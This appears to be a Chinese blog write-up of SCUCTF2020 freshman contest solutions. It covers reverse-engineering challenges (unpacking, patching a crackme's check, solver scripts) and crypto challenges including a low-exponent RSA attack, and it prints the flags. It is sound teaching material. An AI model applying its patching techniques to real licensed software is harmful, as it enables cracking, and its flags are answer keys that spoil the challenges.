

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="1c3y">
  <meta name="keywords" content="">
  
    <meta name="description" content="SCUCTF赛后的一点小小记录… Reverse1.easyF5 扔进IDA,然后F5得到flag:   2.easypack扔进exeinfope,发现有upx壳  直接kali脱壳  在OD打开  然后右键-&gt;中文搜索引擎-&gt;智能搜索,然后在输入语句后一句双击进入  Jnz处F2下断点,F9运行  随便输入一串验证码  回车后得到flag   3.pytrade把pyc文件进行py">
<meta property="og:type" content="article">
<meta property="og:title" content="SCUCTF2020 新生赛">
<meta property="og:url" content="http://example.com/2020/11/29/WriteUp/index.html">
<meta property="og:site_name" content="Icey&#39;s Blog">
<meta property="og:description" content="SCUCTF赛后的一点小小记录… Reverse1.easyF5 扔进IDA,然后F5得到flag:   2.easypack扔进exeinfope,发现有upx壳  直接kali脱壳  在OD打开  然后右键-&gt;中文搜索引擎-&gt;智能搜索,然后在输入语句后一句双击进入  Jnz处F2下断点,F9运行  随便输入一串验证码  回车后得到flag   3.pytrade把pyc文件进行py">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re1/re1.1.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re1/re1.2.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re2/re2.1.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re2/re2.2.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re2/re2.3.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re2/re2.4.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re2/re2.5.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re2/re2.6.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re2/re2.7.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re3/re3.1.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re3/re3.2.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re4/re4.1.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re4/re4.2.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re4/re4.3.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re4/re4.5.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re4/re4.4.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re5/re5.1.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/blob/master/re/re5/re5.2.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re5/re5.3.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re5/re5.4.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re6/re6.1.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re6/re6.2.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re6/re6.3.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re7/re7.1.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re7/re7.2.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re7/re7.3.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/crypto/cry3.1.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/crypto/rsa2.1.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/crypto/rsa3.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/nc.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn2.2.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn2.4.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn2.3.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn3.1.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn3.2.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn3.3.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn3.4.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn3.5.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn4.1.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn4.2.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/misc/misc2.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/WEB/%E4%B8%8B%E8%BD%BD.png">
<meta property="og:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/WEB/123.png">
<meta property="article:published_time" content="2020-11-28T16:47:00.000Z">
<meta property="article:modified_time" content="2022-03-17T14:55:48.139Z">
<meta property="article:author" content="1c3y">
<meta property="article:tag" content="SCU">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re1/re1.1.png">
  
  
  <title>SCUCTF2020 新生赛 - Icey&#39;s Blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/agate.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Icey's Blog" type="application/atom+xml">
</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Icey&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="SCUCTF2020 新生赛">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2020-11-29 00:47" pubdate>
        2020年11月29日 凌晨
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      12k 字
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      105 分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">SCUCTF2020 新生赛</h1>
            
            <div class="markdown-body">
              <p>SCUCTF赛后的一点小小记录…</p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="1-easyF5"><a href="#1-easyF5" class="headerlink" title="1.easyF5"></a>1.easyF5</h3><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re1/re1.1.png" srcset="/img/loading.gif" lazyload></p>
<p>扔进IDA,然后F5得到flag:</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re1/re1.2.png" srcset="/img/loading.gif" lazyload></p>
<hr>
<h3 id="2-easypack"><a href="#2-easypack" class="headerlink" title="2.easypack"></a>2.easypack</h3><p>扔进exeinfope,发现有upx壳</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re2/re2.1.png" srcset="/img/loading.gif" lazyload></p>
<p>直接kali脱壳</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re2/re2.2.png" srcset="/img/loading.gif" lazyload></p>
<p>在OD打开</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re2/re2.3.png" srcset="/img/loading.gif" lazyload></p>
<p>然后右键-&gt;中文搜索引擎-&gt;智能搜索,然后在输入语句后一句双击进入</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re2/re2.4.png" srcset="/img/loading.gif" lazyload></p>
<p>Jnz处F2下断点,F9运行</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re2/re2.5.png" srcset="/img/loading.gif" lazyload></p>
<p>随便输入一串验证码</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re2/re2.6.png" srcset="/img/loading.gif" lazyload></p>
<p>回车后得到flag</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re2/re2.7.png" srcset="/img/loading.gif" lazyload></p>
<hr>
<h3 id="3-pytrade"><a href="#3-pytrade" class="headerlink" title="3.pytrade"></a>3.pytrade</h3><p>把pyc文件进行python反编译</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re3/re3.1.png" srcset="/img/loading.gif" lazyload></p>
<p>将flag_base64进行base64解密,得到flag</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re3/re3.2.png" srcset="/img/loading.gif" lazyload></p>
<hr>
<h3 id="4-crackme"><a href="#4-crackme" class="headerlink" title="4.crackme"></a>4.crackme</h3><p>OD运行,然后右键-&gt;中文搜索引擎-&gt;智能搜索,双击选中error进入</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re4/re4.1.png" srcset="/img/loading.gif" lazyload></p>
<p>选中输入验证码跳转处</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re4/re4.2.png" srcset="/img/loading.gif" lazyload></p>
<p>顺着红线找到跳转开始处</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re4/re4.3.png" srcset="/img/loading.gif" lazyload></p>
<p>将其nop掉</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re4/re4.5.png" srcset="/img/loading.gif" lazyload></p>
<p>选中刚才用NOP填充的代码段,右键单击“复制到可执行文件”—-“选择”,在新弹出的界面上点击右键–单击“保存文件”,然后选择保存路径和文件名即可。</p>
<p>打开刚保存的文件,破解成功</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re4/re4.4.png" srcset="/img/loading.gif" lazyload></p>
<hr>
<h3 id="5-maze"><a href="#5-maze" class="headerlink" title="5.maze"></a>5.maze</h3><p>扔进IDA,F5查看main函数伪代码</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re5/re5.1.png" srcset="/img/loading.gif" lazyload></p>
<p>分析程序可以知道,要救出马老师,需要走15步</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/blob/master/re/re5/re5.2.png" srcset="/img/loading.gif" lazyload></p>
<p>进一步分析,发现输入的路径需要包括‘D’(ascii码值:68)、‘U’(85)、‘R’(82)这3个字符</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re5/re5.3.png" srcset="/img/loading.gif" lazyload></p>
<p>v4是一个二维数组,也就是迷宫;当s[i] == ’D’时,v4的行下标加1,即向下走;当s[i]==‘U’时,v4的行下标减1,即向上走;当s[i] ==’R‘时,v4的列下标加1,即向右走</p>
<p>查看maze</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re5/re5.4.png" srcset="/img/loading.gif" lazyload></p>
<p>结合前面的分析可知,maze是一个5行10列的矩阵,编写python 脚本,得到flag:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">maze  =  <span class="hljs-string">&quot; *   *****&quot;</span> \<br>      <span class="hljs-string">&quot;   * *****&quot;</span> \<br>      <span class="hljs-string">&quot;****  ****&quot;</span> \<br>      <span class="hljs-string">&quot;*****    *&quot;</span> \<br>      <span class="hljs-string">&quot;********  &quot;</span><br><br>route = <span class="hljs-string">&quot;下右右上右右下下右下右右右下右&quot;</span><br>flag = route.replace(<span class="hljs-string">&#x27;下&#x27;</span>, <span class="hljs-built_in">chr</span>(<span class="hljs-number">68</span>)).replace(<span class="hljs-string">&#x27;右&#x27;</span>, <span class="hljs-built_in">chr</span>(<span class="hljs-number">82</span>)).replace(<span class="hljs-string">&#x27;上&#x27;</span>, <span class="hljs-built_in">chr</span>(<span class="hljs-number">85</span>))<br>print(flag)<br></code></pre></div></td></tr></table></figure>


<hr>
<h3 id="6-decryptme"><a href="#6-decryptme" class="headerlink" title="6.decryptme"></a>6.decryptme</h3><p>这是一道算法逆向,先将附件扔进IDA分析</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re6/re6.1.png" srcset="/img/loading.gif" lazyload></p>
<p>定位关键函数encrypt,双击进入</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re6/re6.2.png" srcset="/img/loading.gif" lazyload></p>
<p>加密算法大致思路是:要求输入的字符串v6长度是32,加密函数encrypt传入的两个参数是v4和v6,v6字符串中的每一个字符经过加密,赋值给v4。<br>然后v4和buf进行比较,buf就是v6加密后的结果</p>
<p>查看buf:</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re6/re6.3.png" srcset="/img/loading.gif" lazyload></p>
<p>考虑到flag的字符大都是字母、数字与下划线,可以进行爆破,编写脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 选择ascii码值在48到122之间的字符</span><br>buf = <span class="hljs-string">&quot;34e8h9?&lt;&lt;mkCD&gt;F@DEDCzHxxKRQRNSRS&quot;</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>, <span class="hljs-number">123</span>):<br>        v7 = j<br>        v6 = i<br>        v4 = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            v4 = <span class="hljs-number">2</span> * (v6 &amp; v7)<br>            v7 ^= v6<br>            v6 = v4<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> v4:<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">chr</span>(v7) == buf[i]:<br>            flag += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-keyword">break</span><br>print(flag)<br><br></code></pre></div></td></tr></table></figure>

<p>得到flag:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">33c5d4954da881814420f3ba39772644<br></code></pre></div></td></tr></table></figure>


<hr>
<h3 id="7-pytrade-plus"><a href="#7-pytrade-plus" class="headerlink" title="7.pytrade-plus"></a>7.pytrade-plus</h3><p>使用pyinstxtractor.py对pytrade-plus.exe进行反编译</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">python pyinstxtractor.py pytrade-plus.exe<br></code></pre></div></td></tr></table></figure>
<p>多出了一个目录:</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re7/re7.1.png" srcset="/img/loading.gif" lazyload></p>
<p>在该目录下,找到一个app文件:</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re7/re7.2.png" srcset="/img/loading.gif" lazyload></p>
<p>使用notepad++查看,发现controller字段:</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/re/re7/re7.3.png" srcset="/img/loading.gif" lazyload></p>
<p>在PYZ-00.pyz_extracted目录下找到controller.pyc,进行反编译,发现flag的加密方法:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">verify</span>(<span class="hljs-params">self</span>):</span><br>    <span class="hljs-keyword">try</span>:<br>        flag = self._view.textflag.toPlainText()<br>        flag = flag.replace(<span class="hljs-string">&#x27;scuctf&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        flag = flag.replace(<span class="hljs-string">&#x27;&#125;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        flag = a2b_hex(flag)<br>        x = <span class="hljs-built_in">int</span>(flag)<br>        magicnum = <span class="hljs-number">0xA046AE0418E4646E7C383ADF588B29280C80B2DB5C320B4F5ACF096009FFC7A831D9B89CA1C65F7E1A6F9297720F7L</span><br>        <span class="hljs-keyword">if</span> (x ** <span class="hljs-number">7</span> - <span class="hljs-number">300</span> * x ** <span class="hljs-number">6</span> - x ** <span class="hljs-number">3</span>) + x == magicnum:<br>            self._view.textflag.setPlainText(<span class="hljs-string">&#x27;Yes, it is the real flag!&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>        <span class="hljs-literal">None</span>._view.textflag.setPlainText(<span class="hljs-string">&#x27;NoNoNo!&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">except</span>:<br>        self._view.textflag.setPlainText(<span class="hljs-string">&#x27;NoNoNo!&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br></code></pre></div></td></tr></table></figure>

<p>需要对方程进行求解,然后将解出的x转成16进制字符串,这里使用sympy进行方程求解:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> binascii<br><br>x = symbols(<span class="hljs-string">&#x27;x&#x27;</span>)<br>magicnum = <span class="hljs-number">0xA046AE0418E4646E7C383ADF588B29280C80B2DB5C320B4F5ACF096009FFC7A831D9B89CA1C65F7E1A6F9297720F7</span><br>R1 = solve((x ** <span class="hljs-number">7</span> - <span class="hljs-number">300</span> * x ** <span class="hljs-number">6</span> - x ** <span class="hljs-number">3</span>) + x - magicnum, x)[<span class="hljs-number">0</span>]<br>a = <span class="hljs-built_in">str</span>(R1).encode()<br>b = binascii.b2a_hex(a)<br>print(b)<br><span class="hljs-comment"># scuctf&#123;39333031323433373134303932333037&#125;</span><br></code></pre></div></td></tr></table></figure>


<hr>
<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><hr>
<h3 id="1-classic-1"><a href="#1-classic-1" class="headerlink" title="1.classic_1"></a>1.classic_1</h3><p>cipher = fphpgs{u3yy0_gu15_v5_gur_j0eyq_bs_py4ffvp_Pelcgb}<br>凯撒密码,位移是13</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">scuctf</span>&#123;h<span class="hljs-number">3</span>ll<span class="hljs-number">0</span>_th<span class="hljs-number">15</span>_i<span class="hljs-number">5</span>_the_w<span class="hljs-number">0</span>rld_of_cl<span class="hljs-number">4</span>ssic_Crypto&#125;<br></code></pre></div></td></tr></table></figure>


<hr>
<h3 id="2-classic-2"><a href="#2-classic-2" class="headerlink" title="2.classic_2"></a>2.classic_2</h3><p>多重编码<br>hex-&gt;base64-&gt;摩斯密码<br>解出:</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">scuctf</span>%u<span class="hljs-number">7</span>b<span class="hljs-number">041918</span>fc<span class="hljs-number">1</span>ef<span class="hljs-number">6348768578</span>f<span class="hljs-number">505</span>f<span class="hljs-number">69</span>d<span class="hljs-number">197</span>%u<span class="hljs-number">7</span>d<br></code></pre></div></td></tr></table></figure>
<p>这里需要将%u7b改成:”{“ %u7d改成”}”,得到:</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">scuctf</span>&#123;<span class="hljs-number">041918</span>fc<span class="hljs-number">1</span>ef<span class="hljs-number">6348768578</span>f<span class="hljs-number">505</span>f<span class="hljs-number">69</span>d<span class="hljs-number">197</span>&#125;<br></code></pre></div></td></tr></table></figure>


<hr>
<h3 id="3-RSA-1"><a href="#3-RSA-1" class="headerlink" title="3.RSA_1"></a>3.RSA_1</h3><p>e = 3,该题为低加密指数攻击<br>使用脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: cp936 -*-</span><br><span class="hljs-keyword">import</span> gmpy2<br>e = <span class="hljs-number">3</span><br><span class="hljs-comment"># 读入 n, 密文</span><br>n = <span class="hljs-number">17076697689025821279984148703479525857912324396375097877800474725170566885465833732966897433803722770843910606215420934526050277173030062927090405120718833473629930226217051580832179577629652910778242159108718885516149768995851175071714817922775555170553827627677999093195969471873530031984433631909841287167351534954860426002075822101506835880510505034002629168205724869128357383388034971402180363910826536064357845040799329301895842061729319929568340334416516796267886218679042058969927331452548377324349084816441144473807565907927986545026739667157223640848553663532280797054758912745891410981282851031085852562257</span><br>c = <span class="hljs-number">892408374578063131162925795619920779766603018609992406621503024400320421262482556891045333045408815199768659578199823419716777827460090306221618906101139272423449131313434967763664295600593363990276765767066758967765012850672428517786210813209127040442832574380675662826137452780727264357</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;n=&#x27;</span>, n<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;c=&#x27;</span>, c<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;[+]Detecting m...&#x27;</span><br>result = gmpy2.iroot(c, <span class="hljs-number">3</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;  [-]The c has cubic root?&#x27;</span>, result[<span class="hljs-number">1</span>]<br><span class="hljs-keyword">if</span> result[<span class="hljs-number">1</span>]: <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;  [-]The m is:&#x27;</span>, <span class="hljs-string">&#x27;&#123;:x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(result[<span class="hljs-number">0</span>]).decode(<span class="hljs-string">&#x27;hex&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;[!]All Done!&#x27;</span><br></code></pre></div></td></tr></table></figure>
<p>得到flag:</p>
<p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/crypto/cry3.1.png" srcset="/img/loading.gif" lazyload></p>
<hr>
